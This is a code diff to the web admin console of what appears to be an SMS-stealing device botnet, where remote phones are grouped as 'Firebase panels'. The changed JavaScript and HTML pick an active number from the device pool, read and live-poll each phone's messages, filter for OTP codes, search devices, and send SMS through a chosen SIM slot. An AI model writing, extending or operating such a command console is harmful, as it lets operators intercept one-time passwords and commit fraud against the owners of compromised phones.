@@ -535,6 +535,31 @@ tbody tr:hover{background:rgba(0,229,200,.04)}
 .search-row input{flex:1}
 .quick-actions{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px;margin-bottom:12px}
 @media(min-width:760px){.quick-actions{grid-template-columns:repeat(4,minmax(0,1fr))}}
+.admin-number-layout{display:grid;gap:12px}
+.admin-tools-grid{display:grid;grid-template-columns:1fr;gap:12px;margin-top:12px}
+@media(min-width:900px){.admin-tools-grid{grid-template-columns:1fr 1fr}}
+.mini-panel{border:1px solid var(--border);border-radius:10px;background:rgba(0,10,22,.42);padding:12px;min-height:120px}
+.mini-title{display:flex;align-items:center;gap:7px;margin-bottom:10px;color:var(--c);font-size:.68rem;letter-spacing:1.3px;text-transform:uppercase;font-weight:700}
+.mini-title svg{width:14px;height:14px;stroke:var(--c);stroke-width:1.8;fill:none;stroke-linecap:round;stroke-linejoin:round}
+.number-detail{border:1px solid rgba(0,229,200,.18);border-radius:10px;background:rgba(0,229,200,.035);padding:14px;min-height:138px}
+.detail-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px 14px;margin-top:10px}
+@media(min-width:800px){.detail-grid{grid-template-columns:repeat(4,minmax(0,1fr))}}
+.detail-label{font-size:.58rem;color:var(--dim);letter-spacing:1px;text-transform:uppercase}
+.detail-value{font-family:'Share Tech Mono',monospace;color:var(--text);margin-top:2px;word-break:break-all}
+.sms-toolbar{display:grid;grid-template-columns:1fr;gap:8px;margin:12px 0}
+@media(min-width:760px){.sms-toolbar{grid-template-columns:1.5fr .8fr auto auto}}
+.sms-list{max-height:520px;overflow:auto;border:1px solid var(--border);border-radius:10px;background:rgba(0,10,22,.35)}
+.sms-item{padding:12px 14px;border-bottom:1px solid rgba(0,229,200,.08);text-align:left}
+.sms-item:last-child{border-bottom:none}
+.sms-head{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:7px}
+.sms-sender{font-weight:700;color:var(--c);letter-spacing:.5px}
+.sms-time{color:var(--dim);font-size:.68rem;white-space:nowrap}
+.sms-body{white-space:pre-wrap;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:.8rem;line-height:1.5}
+.saved-list,.search-list{max-height:260px;overflow:auto}
+.saved-row,.search-row-result{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:9px 0;border-top:1px solid rgba(0,229,200,.08);text-align:left}
+.saved-row:first-child,.search-row-result:first-child{border-top:none}
+.row-main{min-width:0}
+.row-main .mono{display:block;color:var(--c)}
 .user-actions{display:flex;gap:4px;flex-wrap:wrap;min-width:240px}
 .access-line{display:flex;gap:4px;flex-wrap:wrap}
 .credit-cell{font-family:'Orbitron',sans-serif;color:var(--c);font-weight:700;text-shadow:0 0 10px rgba(0,229,200,.25)}
@@ -659,23 +684,41 @@ tbody tr:hover{background:rgba(0,229,200,.04)}
         <div class="card">
           <div class="card-header"><span class="card-title"><svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/><path d="M8 6h8"/></svg>Admin Number Room</span></div>
           <div class="card-body">
-            <button class="btn btn-primary btn-full" onclick="adminGetNumber(this)"><span id="admin-num-spin" style="display:none" class="spin"></span><svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>Get Random Number</button>
-            <div id="admin-number-result" class="empty" style="margin-top:10px">No admin number generated yet</div>
-            <div class="quick-actions" style="margin-top:14px">
-              <button class="btn btn-success" onclick="adminToggleLiveSms(this)"><svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg><span id="admin-live-label">Live SMS</span></button>
-              <button class="btn btn-primary" onclick="adminLoadSmsHistory()"><svg viewBox="0 0 24 24"><path d="M3 12a9 9 0 1 0 3-6.7"/><path d="M3 3v6h6"/><path d="M12 7v5l3 2"/></svg>SMS History</button>
-              <button class="btn btn-primary" onclick="adminRenderSavedNumbers()"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>Saved Numbers</button>
-              <button class="btn btn-danger" onclick="adminClearCurrentNumber()"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>Clear</button>
+            <div class="admin-number-layout">
+              <button class="btn btn-primary btn-full" onclick="adminGetNumber(this)"><span id="admin-num-spin" style="display:none" class="spin"></span><svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>Get Random Number</button>
+              <div class="admin-tools-grid">
+                <div class="mini-panel">
+                  <div class="mini-title"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>Saved Numbers</div>
+                  <div id="admin-saved-numbers" class="saved-list empty">No saved numbers yet</div>
+                </div>
+                <div class="mini-panel">
+                  <div class="mini-title"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>Search Number</div>
+                  <div class="search-row" style="margin-bottom:8px"><input id="admin-number-search" placeholder="Search number or device ID"/><button class="btn btn-primary" onclick="adminSearchNumber(this)"><span id="admin-search-spin" style="display:none" class="spin"></span><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg></button></div>
+                  <div id="admin-search-results" class="search-list empty">Search saved Firebase panels</div>
+                </div>
+              </div>
+              <div class="number-detail" id="admin-number-result">No admin number generated yet</div>
+              <div class="quick-actions">
+                <button class="btn btn-success" onclick="adminToggleLiveSms(this)"><svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg><span id="admin-live-label">Live SMS</span></button>
+                <button class="btn btn-primary" onclick="adminLoadSmsHistory()"><svg viewBox="0 0 24 24"><path d="M3 12a9 9 0 1 0 3-6.7"/><path d="M3 3v6h6"/><path d="M12 7v5l3 2"/></svg>Load 100 SMS</button>
+                <button class="btn btn-primary" onclick="adminRenderSavedNumbers()"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>Refresh Saved</button>
+                <button class="btn btn-danger" onclick="adminClearCurrentNumber()"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>Clear</button>
+              </div>
+              <div class="form-grid c3">
+                <div class="form-group"><label>Send To</label><input id="admin-send-to" placeholder="91XXXXXXXXXX"/></div>
+                <div class="form-group"><label>SIM Slot</label><select id="admin-send-sim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>
+                <div class="form-group"><label>Command</label><button class="btn btn-success btn-full" onclick="adminSendSms(this)"><span id="admin-send-spin" style="display:none" class="spin"></span><svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>Send SMS</button></div>
+                <div class="form-group" style="grid-column:1/-1"><label>Message</label><textarea id="admin-send-message" placeholder="Type SMS message here"></textarea></div>
+              </div>
+              <div id="admin-live-box" class="mini-panel">Live SMS not started</div>
+              <div class="sms-toolbar">
+                <input id="admin-sms-search" placeholder="Search sender, OTP, number, message" oninput="adminRenderCurrentSms()"/>
+                <select id="admin-sms-filter" onchange="adminRenderCurrentSms()"><option value="all">All SMS</option><option value="otp">OTP Only</option><option value="today">Today</option></select>
+                <button class="btn btn-primary" onclick="adminLoadSmsHistory()"><svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>Refresh</button>
+                <button class="btn btn-danger" onclick="adminClearSmsFilter()"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>Reset</button>
+              </div>
+              <div id="admin-sms-history" class="sms-list"><div class="empty">Select a number and load SMS history</div></div>
             </div>
-            <div class="form-grid c3" style="margin-top:14px">
-              <div class="form-group"><label>Send To</label><input id="admin-send-to" placeholder="91XXXXXXXXXX"/></div>
-              <div class="form-group"><label>SIM Slot</label><select id="admin-send-sim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>
-              <div class="form-group"><label>Command</label><button class="btn btn-success btn-full" onclick="adminSendSms(this)"><span id="admin-send-spin" style="display:none" class="spin"></span><svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>Send SMS</button></div>
-              <div class="form-group" style="grid-column:1/-1"><label>Message</label><textarea id="admin-send-message" placeholder="Type SMS message here"></textarea></div>
-            </div>
-            <div id="admin-live-box" class="empty" style="margin-top:10px">Live SMS not started</div>
-            <div id="admin-sms-history" class="empty" style="margin-top:10px">SMS history will appear here</div>
-            <div id="admin-saved-numbers" class="empty" style="margin-top:10px">Saved numbers will appear here</div>
           </div>
         </div>
       </div>
@@ -844,22 +887,28 @@ async function addBulkPanels(){
 }
 async function delPanel(id,btn){if(!confirm('Delete this panel?'))return;btn.disabled=true;try{const r=await fetch(B+'/api/panels/'+id,{method:'DELETE'});if(r.ok){toast('Deleted');loadPanels();loadDashboard();}else toast('Failed',false);}catch{toast('Error',false);}finally{btn.disabled=false;}}
 async function clearAllPanels(btn){if(!confirm('Delete ALL saved Firebase panels?'))return;if(!confirm('Confirm again: this will remove every Firebase URL from the database.'))return;btn.disabled=true;try{const r=await fetch(B+'/api/panels',{method:'DELETE'});if(r.ok){const d=await r.json();toast('Deleted '+(d.deleted||0)+' panels');loadPanels();loadDashboard();}else toast('Clear failed',false);}catch{toast('Network error',false);}finally{btn.disabled=false;}}
-let adminCurrentNumber=null,adminLiveTimer=null,adminLastSmsKey='';
+let adminCurrentNumber=null,adminLiveTimer=null,adminLastSmsKey='',adminSmsCache=[];
 function adminSavedNumbers(){try{return JSON.parse(localStorage.getItem('annebella-admin-saved-numbers')||'[]');}catch{return[];}}
 function adminStoreNumber(d){if(!d||!d.deviceId||!d.panelId)return;adminCurrentNumber=d;const saved=adminSavedNumbers().filter(x=>!(x.deviceId===d.deviceId&&x.panelId===d.panelId));saved.unshift({...d,savedAt:new Date().toISOString()});localStorage.setItem('annebella-admin-saved-numbers',JSON.stringify(saved.slice(0,30)));adminRenderSavedNumbers(false);}
-function adminNumberHtml(d){return '<div style="text-align:left;line-height:1.8"><b>Random Number Generated</b><br><span style="color:var(--dim)">Number</span> <span class="mono" style="color:var(--c)">'+esc(d.number||'—')+'</span><br><span style="color:var(--dim)">Device</span> '+esc(d.deviceName||d.deviceId)+'<br><span style="color:var(--dim)">Panel</span> '+esc(d.panelName)+' (#'+esc(d.panelId)+')<br><span style="color:var(--dim)">Status</span> <span class="badge b-on">'+esc(d.status||'online')+'</span><br><span style="color:var(--dim)">Battery</span> '+esc(d.battery||'—')+'<br><span style="color:var(--dim)">SMS</span> '+esc(d.totalSms||0)+'</div>';}
-async function adminGetNumber(btn){const box=document.getElementById('admin-number-result'),sp=document.getElementById('admin-num-spin');btn.disabled=true;sp.style.display='';box.innerHTML='Searching active number...';try{const r=await fetch(B+'/api/panels/random-number',{cache:'no-store'});const d=await r.json();if(r.ok){adminStoreNumber(d);document.getElementById('admin-send-to').value=d.number||'';box.innerHTML=adminNumberHtml(d);document.getElementById('admin-live-box').innerHTML='Ready for live SMS';document.getElementById('admin-sms-history').innerHTML='Click SMS History to load latest messages';toast('Admin number generated');}else{box.innerHTML=esc(d.error||'No active number found');toast(d.error||'No active number found',false);}}catch{box.innerHTML='Network error';toast('Network error',false);}finally{sp.style.display='none';btn.disabled=false;}}
+function adminNumberHtml(d){return '<div><b>Number Details</b><div class="detail-grid"><div><div class="detail-label">Number</div><div class="detail-value" style="color:var(--c)">'+esc(d.number||'—')+'</div></div><div><div class="detail-label">Device ID</div><div class="detail-value">'+esc(d.deviceId||'—')+'</div></div><div><div class="detail-label">Device</div><div class="detail-value">'+esc(d.deviceName||'—')+'</div></div><div><div class="detail-label">Panel</div><div class="detail-value">'+esc(d.panelName||'—')+' (#'+esc(d.panelId||'—')+')</div></div><div><div class="detail-label">Status</div><div class="detail-value"><span class="badge '+(d.status==='online'?'b-on':'b-off')+'">'+esc(d.status||'—')+'</span></div></div><div><div class="detail-label">Battery</div><div class="detail-value">'+esc(d.battery||'—')+'</div></div><div><div class="detail-label">SMS</div><div class="detail-value">'+esc(d.totalSms||0)+'</div></div><div><div class="detail-label">Last Seen</div><div class="detail-value">'+esc(d.lastSeen?new Date(d.lastSeen).toLocaleString():'—')+'</div></div></div></div>';}
+async function adminGetNumber(btn){const box=document.getElementById('admin-number-result'),sp=document.getElementById('admin-num-spin');btn.disabled=true;sp.style.display='';box.innerHTML='Searching active number...';try{const r=await fetch(B+'/api/panels/random-number',{cache:'no-store'});const d=await r.json();if(r.ok){adminUseNumber(d,'Admin number generated');}else{box.innerHTML=esc(d.error||'No active number found');toast(d.error||'No active number found',false);}}catch{box.innerHTML='Network error';toast('Network error',false);}finally{sp.style.display='none';btn.disabled=false;}}
+function adminUseNumber(d,msg='Number selected'){adminStoreNumber(d);adminSmsCache=[];adminLastSmsKey='';document.getElementById('admin-number-result').innerHTML=adminNumberHtml(d);document.getElementById('admin-send-to').value=d.number||'';document.getElementById('admin-live-box').innerHTML='Ready for live SMS';document.getElementById('admin-sms-history').innerHTML='<div class="empty">Click Load 100 SMS to view messages</div>';toast(msg);}
 function adminRequireNumber(){if(adminCurrentNumber&&adminCurrentNumber.panelId&&adminCurrentNumber.deviceId)return adminCurrentNumber;toast('Generate or select a saved number first',false);return null;}
 async function adminFetchSms(){const n=adminRequireNumber();if(!n)return null;const r=await fetch(B+'/api/panels/'+encodeURIComponent(n.panelId)+'/devices/'+encodeURIComponent(n.deviceId)+'/sms',{cache:'no-store'});const d=await r.json();if(!r.ok)throw new Error(d.error||'SMS load failed');return d;}
 function adminSmsKey(m){return [m.sender||'',m.time||'',m.text||''].join('|');}
-function adminRenderSmsMessages(target,d,limit){const msgs=(d.messages||[]).slice(0,limit);if(!msgs.length){target.innerHTML='No SMS found for this number';return;}target.innerHTML='<div style="text-align:left;line-height:1.7"><b>SMS History ('+esc(d.total||msgs.length)+' total)</b>'+msgs.map((m,i)=>'<div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border)"><b>#'+(i+1)+' '+esc(m.sender||'Unknown')+'</b><br><span style="color:var(--dim)">'+esc(m.time||'No time')+'</span><br><code style="white-space:pre-wrap;color:var(--text)">'+esc(m.text||'')+'</code></div>').join('')+'</div>';}
-async function adminLoadSmsHistory(){const box=document.getElementById('admin-sms-history');box.innerHTML='Loading SMS history...';try{const d=await adminFetchSms();if(!d)return;adminRenderSmsMessages(box,d,15);toast('SMS history loaded');}catch(e){box.innerHTML=esc(e.message||'SMS load failed');toast('SMS load failed',false);}}
+function adminMessageLooksToday(m){const ts=Date.parse(m.time||'');if(!isNaN(ts))return new Date(ts).toDateString()===new Date().toDateString();return String(m.time||'').includes(new Date().toLocaleDateString('en-GB').replace(/\\//g,'-'));}
+function adminRenderCurrentSms(){const box=document.getElementById('admin-sms-history'),q=(document.getElementById('admin-sms-search')?.value||'').toLowerCase(),filter=document.getElementById('admin-sms-filter')?.value||'all';let msgs=adminSmsCache.slice(0,100);if(filter==='otp')msgs=msgs.filter(m=>/\\b\\d{4,8}\\b/.test(m.text||''));if(filter==='today')msgs=msgs.filter(adminMessageLooksToday);if(q)msgs=msgs.filter(m=>[m.sender,m.time,m.text].join(' ').toLowerCase().includes(q));if(!msgs.length){box.innerHTML='<div class="empty">No SMS matched</div>';return;}box.innerHTML=msgs.map((m,i)=>'<div class="sms-item"><div class="sms-head"><span class="sms-sender">#'+(i+1)+' '+esc(m.sender||'Unknown')+'</span><span class="sms-time">'+esc(m.time||'No time')+'</span></div><div class="sms-body">'+esc(m.text||'')+'</div></div>').join('');}
+async function adminLoadSmsHistory(){const box=document.getElementById('admin-sms-history');box.innerHTML='<div class="empty">Loading 100 SMS...</div>';try{const d=await adminFetchSms();if(!d)return;adminSmsCache=(d.messages||[]).slice(0,100);adminRenderCurrentSms();toast('Loaded '+adminSmsCache.length+' SMS');}catch(e){box.innerHTML='<div class="empty">'+esc(e.message||'SMS load failed')+'</div>';toast('SMS load failed',false);}}
 async function adminLivePoll(){const box=document.getElementById('admin-live-box');try{const d=await adminFetchSms();if(!d)return;const latest=(d.messages||[])[0];if(!latest){box.innerHTML='Live SMS running - no messages yet';return;}const key=adminSmsKey(latest);if(key!==adminLastSmsKey){adminLastSmsKey=key;box.innerHTML='<div style="text-align:left;line-height:1.7"><b>Latest Live SMS</b><br><span style="color:var(--dim)">'+esc(latest.sender||'Unknown')+' - '+esc(latest.time||'No time')+'</span><br><code style="white-space:pre-wrap;color:var(--text)">'+esc(latest.text||'')+'</code></div>';}}catch(e){box.innerHTML=esc(e.message||'Live SMS failed');}}
 function adminToggleLiveSms(btn){const label=document.getElementById('admin-live-label');if(adminLiveTimer){clearInterval(adminLiveTimer);adminLiveTimer=null;label.textContent='Live SMS';document.getElementById('admin-live-box').innerHTML='Live SMS stopped';toast('Live SMS stopped');return;}if(!adminRequireNumber())return;adminLastSmsKey='';label.textContent='Stop Live';document.getElementById('admin-live-box').innerHTML='Live SMS watching...';adminLivePoll();adminLiveTimer=setInterval(adminLivePoll,5000);toast('Live SMS started');}
 async function adminSendSms(btn){const n=adminRequireNumber();if(!n)return;const to=document.getElementById('admin-send-to').value.trim(),message=document.getElementById('admin-send-message').value.trim(),simSlot=Number(document.getElementById('admin-send-sim').value||1),sp=document.getElementById('admin-send-spin');if(!to||!message){toast('Number and message required',false);return;}btn.disabled=true;sp.style.display='';try{const r=await fetch(B+'/api/panels/'+encodeURIComponent(n.panelId)+'/devices/'+encodeURIComponent(n.deviceId)+'/send-sms',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({to,message,simSlot})});const d=await r.json().catch(()=>({}));if(r.ok){toast('SMS command sent');document.getElementById('admin-send-message').value='';}else toast(d.error||'SMS send failed',false);}catch{toast('Network error',false);}finally{sp.style.display='none';btn.disabled=false;}}
-function adminSelectSavedNumber(i){const d=adminSavedNumbers()[i];if(!d)return;adminCurrentNumber=d;document.getElementById('admin-number-result').innerHTML=adminNumberHtml(d);document.getElementById('admin-send-to').value=d.number||'';toast('Saved number selected');}
-function adminRenderSavedNumbers(showToast=true){const box=document.getElementById('admin-saved-numbers'),saved=adminSavedNumbers();if(!saved.length){box.innerHTML='No saved numbers yet';return;}box.innerHTML='<div style="text-align:left;line-height:1.7"><b>Saved Numbers</b>'+saved.map((d,i)=>'<div style="display:flex;align-items:center;justify-content:space-between;gap:8px;margin-top:10px;padding-top:10px;border-top:1px solid var(--border)"><div><span class="mono" style="color:var(--c)">'+esc(d.number||'—')+'</span><br><span style="color:var(--dim)">'+esc(d.panelName||'Panel')+' / '+esc(d.deviceName||d.deviceId)+'</span></div><button class="btn btn-primary btn-sm" onclick="adminSelectSavedNumber('+i+')">Use</button></div>').join('')+'</div>';if(showToast)toast('Saved numbers loaded');}
-function adminClearCurrentNumber(){adminCurrentNumber=null;adminLastSmsKey='';if(adminLiveTimer){clearInterval(adminLiveTimer);adminLiveTimer=null;document.getElementById('admin-live-label').textContent='Live SMS';}document.getElementById('admin-number-result').innerHTML='No admin number generated yet';document.getElementById('admin-live-box').innerHTML='Live SMS not started';document.getElementById('admin-sms-history').innerHTML='SMS history will appear here';toast('Current number cleared');}
+function adminSelectSavedNumber(i){const d=adminSavedNumbers()[i];if(!d)return;adminUseNumber(d,'Saved number selected');}
+function adminRenderSavedNumbers(showToast=true){const box=document.getElementById('admin-saved-numbers'),saved=adminSavedNumbers();if(!box)return;if(!saved.length){box.innerHTML='No saved numbers yet';return;}box.classList.remove('empty');box.innerHTML=saved.map((d,i)=>'<div class="saved-row"><div class="row-main"><span class="mono">'+esc(d.number||'—')+'</span><span style="color:var(--dim);font-size:.68rem">'+esc(d.panelName||'Panel')+' / '+esc(d.deviceName||d.deviceId)+'</span></div><button class="btn btn-primary btn-sm" onclick="adminSelectSavedNumber('+i+')">Use</button></div>').join('');if(showToast)toast('Saved numbers loaded');}
+async function adminSearchNumber(btn){const q=document.getElementById('admin-number-search').value.trim(),box=document.getElementById('admin-search-results'),sp=document.getElementById('admin-search-spin');if(q.length<3){toast('Enter at least 3 characters',false);return;}btn.disabled=true;sp.style.display='';box.innerHTML='Searching panels...';try{const r=await fetch(B+'/api/panels/search-number?q='+encodeURIComponent(q),{cache:'no-store'});const d=await r.json();if(!r.ok){box.innerHTML=esc(d.error||'Search failed');toast(d.error||'Search failed',false);return;}if(!d.matches?.length){box.innerHTML='No matching number or device found';return;}box.classList.remove('empty');box.innerHTML=d.matches.map((m,i)=>'<div class="search-row-result"><div class="row-main"><span class="mono">'+esc(m.number||m.deviceId)+'</span><span style="color:var(--dim);font-size:.68rem">'+esc(m.panelName)+' / '+esc(m.deviceName||m.deviceId)+' / '+esc(m.status)+'</span></div><button class="btn btn-primary btn-sm" onclick="adminUseSearchResult('+i+')">Use</button></div>').join('');window._adminSearchMatches=d.matches;toast('Found '+d.matches.length+' result(s)');}catch{box.innerHTML='Network error';toast('Network error',false);}finally{sp.style.display='none';btn.disabled=false;}}
+function adminUseSearchResult(i){const d=(window._adminSearchMatches||[])[i];if(d)adminUseNumber(d,'Search number selected');}
+function adminClearSmsFilter(){document.getElementById('admin-sms-search').value='';document.getElementById('admin-sms-filter').value='all';adminRenderCurrentSms();}
+function adminClearCurrentNumber(){adminCurrentNumber=null;adminLastSmsKey='';adminSmsCache=[];if(adminLiveTimer){clearInterval(adminLiveTimer);adminLiveTimer=null;document.getElementById('admin-live-label').textContent='Live SMS';}document.getElementById('admin-number-result').innerHTML='No admin number generated yet';document.getElementById('admin-live-box').innerHTML='Live SMS not started';document.getElementById('admin-sms-history').innerHTML='<div class="empty">Select a number and load SMS history</div>';toast('Current number cleared');}
+adminRenderSavedNumbers(false);
 let _all=[];
 async function loadUsers(){try{_all=await(await fetch(B+'/api/users')).json();renderUsers(_all);}catch{toast('Users load failed',false);}}
 function searchUsers(){const q=document.getElementById('u-search').value.toLowerCase();renderUsers(_all.filter(u=>(u.firstName||'').toLowerCase().includes(q)||(u.username||'').toLowerCase().includes(q)||(u.telegramId||'').includes(q)));}
